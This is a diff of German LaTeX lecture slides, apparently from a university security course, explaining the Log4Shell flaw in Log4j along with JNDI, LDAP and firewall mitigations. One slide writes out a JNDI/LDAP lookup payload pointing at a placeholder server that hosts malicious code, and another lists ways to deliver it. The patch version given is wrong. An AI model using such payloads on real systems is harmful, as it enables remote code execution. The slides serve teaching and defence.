@@ -57,7 +57,7 @@
  $\Rightarrow$ Läuft auf über 3 Milliarden Geräten
  \item Adaption der Log4J Konzepte von vielen Programmiersprachen\\
  - Log4C, Log4cplus, Log4js, Logging in Python 
- \item Betreuung durch das Apache Logging Projekt
+ \item Betreuung durch das Apache Logging Projekt\footnote{apache.org}
 \end{itemize}
 \end{frame}
 \begin{frame}{Was ist Log4Shell?}
@@ -71,7 +71,7 @@ $\Rightarrow$ Remote Code Exection, Reverse Shell etc.
 
 \end{itemize}
 \begin{center}
- \includegraphics[scale=0.35]{bsilog4j.png}
+ \includegraphics[scale=0.35]{bsilog4j.png}\footnote{bsi.de}
 \end{center}
 
 
@@ -121,9 +121,12 @@ $\Rightarrow$ log4j.xml
 
 \subsection{Jindi}
 \begin{frame}{Jindi}
-$\Rightarrow$ `Java Naming and Directory Interface`
+$\Rightarrow$ `Java Naming and Directory Interface`\footnote{apache.com}
 \begin{itemize}
- \item Web-API für Datenbankabfragen
+ \item Web-API für Objektabfragen\\
+ - Meist genutzt für Datenbankabfragen
+ 
+ 
  \item Jindi darf mit anderen Servern Kommunizieren\\
  $\Rightarrow$ logger.info("\$\{jndi: Server-IP\}")
 \end{itemize}
@@ -131,7 +134,7 @@ $\Rightarrow$ `Java Naming and Directory Interface`
 \end{frame}
 \subsection{Ldap}
 \begin{frame}{LDAP}
-$\Rightarrow$ 'Lightweight Directory Access Protocol'
+$\Rightarrow$ 'Lightweight Directory Access Protocol'\footnote{wikipedia.org}
  \begin{itemize}
   \item Protokoll für Nutzwerverwaltung\\
   - 'Darf sich dieser Nutzer einloggen?'\\
@@ -159,11 +162,14 @@ $\Rightarrow$ \textbf{\$\{jndi:ldap//:myserver.de/schadcode\}}
 
 \begin{frame}{Log4Shell Funktionsweiße}
 \begin{center}
-\includegraphics[scale=0.35]{log4s.png}
+\includegraphics[scale=0.35]{log4s.png}\footnote{draw.io}
 \end{center}
 \end{frame}
 \begin{frame}
  \begin{itemize}
+ \item Payloadübergabe kann über etliche Wege erfolgen\\
+  - HTTP Header\\
+  - Fehlerhafte HTTP Request
   \item String muss entsprechend Endcodes sein\\
   - base64, urlencoding
   \item Schadcode muss compilierter Java Byte-Code sein
@@ -174,17 +180,43 @@ $\Rightarrow$ \textbf{\$\{jndi:ldap//:myserver.de/schadcode\}}
 \begin{frame}{Praktische Vorstellung}
  
 \end{frame}
-\begin{frame}{Lösungen}
+\begin{frame}{Lösungsansätze}
 \begin{itemize}
  \item Log4J Updaten auf 2.1.6
+ \item Userinput validieren
  \item Firewall Regeln entsprechend auslegen\\
- - Output-Chain
-\end{itemize}
-
+ - Output-Chain auschließlich für bekannte Dienste.
+ \end{itemize}
+ \begin{center}
+ \includegraphics[scale=0.35]{outputchainldpa.png}
+ \end{center}
  
 \end{frame}
+\begin{frame}
+\begin{center}
+\includegraphics[scale=0.35]{firewall.png}\footnote{draw.io}
+\end{center}
+\end{frame}
+
 \begin{frame}{Fazit und Ausblick}
- 
+ \begin{itemize}
+  \item Größte Sicherheitslücke der letzten 10 Jahre
+  \item Ausmaße noch nicht bekannt
+  \item Möglich nur durch zusammenspiel vieler einzelner Komponenten\\
+  - Tech-Stack zu groß?\\
+  - Overengineering?
+  \item  Anwendungen werden zu komplex\\
+  
+ \end{itemize}
+
+\end{frame}
+\begin{frame}{Quellen}
+1 | apache.org, 19.02.2022, https://logging.apache.org/log4j/2.x/ \\
+2 | bsi.de, 15.02.2022, https://www.bsi.bund.de/DE/Themen/Unternehmen\-und\-Organisationen/Informationen\-und\-Empfehlungen/Empfehlungen\-nach\-Angriffszielen/Webanwendungen/log4j/log4j\_node.html \\
+3 | apache.org, 18.02.2022, https://aries.apache.org/documentation/modules/jndiproject.html\\
+4 | wikipedia.org, 12.01.2022, https://en.wikipedia.org/wiki/Lightweight\_Directory\_Access\_Protocol\\
+5-6 | draw.io, 20.02.2022, https://draw.io\\ 
+- Vorlesungsfolien Netzwerk und Systemsicherheit, Prof. Dr. Christian Henrich, Wintersemester 2021/22
 \end{frame}
 
 
